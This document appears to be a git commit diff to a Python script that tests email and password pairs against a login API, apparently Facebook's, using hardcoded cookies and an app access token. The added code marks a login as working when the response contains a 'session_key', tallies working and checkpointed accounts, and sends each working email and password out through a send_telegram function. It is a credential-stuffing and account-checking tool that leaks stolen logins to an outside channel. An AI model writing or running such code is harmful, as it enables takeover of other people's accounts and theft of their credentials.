ea8a7c5cb3afdb2e36f6e5582c3fc82adec04944
المطور إبراهيم | • 𝑷𝒚𝒕𝒉𝒐𝒏 • <mesa14719@gmail.com>
2026-09-03 23:21:36 +0100

    Implement session key check and response handling
    Add session handling and response processing for login.

--- تست.py
+++ تست.py
@@ -1,7 +1,3 @@
-
-
-
-	
 	cookies = {
     'datr': 'UQ-Baol52a5iz2RvO3vKbOMn',
     'sb': 'UQ-BatRDIIUWbsYhLEvoC2KA',
@@ -17,3 +13,19 @@
 	data = {'email':em,  'password':pas, 'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'format':'JSON'}
 	
 	response = requests.post(url, headers=headers, data=data,cookies=cookies,timeout=5).text
+
+
+	if 'session_key' in response:
+		OK += 1
+		Total += 1
+		f1 = f" email = {em} "
+		f2 = f" password = {pas}"
+		g = f"{f1}\n{f2}"
+		send_telegram(g)
+		print(
+		f"\r{G}  Cheked : [{Total}] {M}==> {R} CP [{CP}] {M}==> {L} OK : [{OK}] ",end="")
+	else:
+		Total += 1
+		CP += 1
+		print(
+		f"\r{G}  Cheked : [{Total}] {M}==> {R} CP [{CP}] {M}==> {L} OK : [{OK}] ",end="")
